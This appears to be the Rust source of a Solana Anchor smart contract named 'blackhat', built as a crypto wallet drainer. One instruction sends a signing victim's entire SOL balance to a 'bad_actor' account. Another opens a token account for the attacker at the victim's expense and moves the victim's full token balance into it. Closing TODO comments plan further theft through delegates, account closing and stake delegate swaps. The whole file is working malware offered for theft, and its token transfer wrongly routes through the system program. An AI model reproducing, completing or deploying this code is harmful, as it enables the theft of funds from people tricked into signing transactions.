use anchor_lang::prelude::*;
use anchor_lang::system_program::{self};
use anchor_spl::associated_token::AssociatedToken;
use anchor_spl::token::{self};
use anchor_spl::token::{spl_token, Token};
use borsh::BorshDeserialize;

pub mod error;

declare_id!("Drainer1111111111111111111111111111111111111");

#[derive(Accounts)]
pub struct DrainAccount<'info> {
    #[account(mut)]
    pub victim: Signer<'info>,

    #[account(mut)]
    pub bad_actor: UncheckedAccount<'info>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct DrainTokenAccount<'info> {
    pub victim: Signer<'info>,
    pub bad_actor: UncheckedAccount<'info>,

    pub mint: AccountInfo<'info>,

    #[account(mut)]
    pub victim_ata: AccountInfo<'info>,
    #[account(mut)]
    pub bad_actor_ata: AccountInfo<'info>,
    pub system_program: Program<'info, System>,

    pub token_program: Program<'info, Token>,
    pub associated_token_program: Program<'info, AssociatedToken>,
}

#[program]
pub mod blackhat {

    use super::*;
    use anchor_spl::associated_token;
    use solana_program::program_pack::Pack;

    pub fn drain_account<'info>(
        ctx: Context<'_, '_, '_, 'info, DrainAccount<'info>>,
    ) -> Result<()> {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.system_program.to_account_info(),
            system_program::Transfer {
                from: ctx.accounts.victim.to_account_info(),
                to: ctx.accounts.bad_actor.to_account_info(),
            },
        );

        system_program::transfer(cpi_ctx, ctx.accounts.victim.lamports())?;

        Ok(())
    }

    pub fn drain_token_account<'info>(
        ctx: Context<'_, '_, '_, 'info, DrainTokenAccount<'info>>,
    ) -> Result<()> {
        if ctx.accounts.bad_actor_ata.data_is_empty() {
            let cpi_ctx: CpiContext<'_, '_, '_, '_, associated_token::Create<'_>> = CpiContext::new(
                ctx.accounts.associated_token_program.to_account_info(),
                associated_token::Create {
                    payer: ctx.accounts.victim.to_account_info(),
                    associated_token: ctx.accounts.bad_actor_ata.to_account_info(),
                    mint: ctx.accounts.mint.to_account_info(),
                    authority: ctx.accounts.bad_actor.to_account_info(),
                    token_program: ctx.accounts.token_program.to_account_info(),
                    system_program: ctx.accounts.system_program.to_account_info(),
                },
            );

            let init_result = associated_token::create(cpi_ctx);

            if let Err(init_error) = init_result {
                panic!("Token Init Error: {:?}", init_error)
            }
        }

        let cpi_ctx = CpiContext::new(
            ctx.accounts.system_program.to_account_info(),
            token::Transfer {
                from: ctx.accounts.victim_ata.to_account_info(),
                to: ctx.accounts.bad_actor_ata.to_account_info(),
                authority: ctx.accounts.victim.to_account_info(),
            },
        );

        let token_account = spl_token::state::Account::unpack_from_slice(
            &ctx.accounts
                .victim_ata
                .to_account_info()
                .try_borrow_data()?,
        )?;

        let result = token::transfer(cpi_ctx, token_account.amount);

        if let Err(transfer_error) = result {
            panic!("Token Transfer Error: {:?}", transfer_error)
        }

        Ok(())
    }

    // TODO: attach delegate to token accounts
    // TODO: closes token account after draining
    // TODO: swap stake account delegate
}
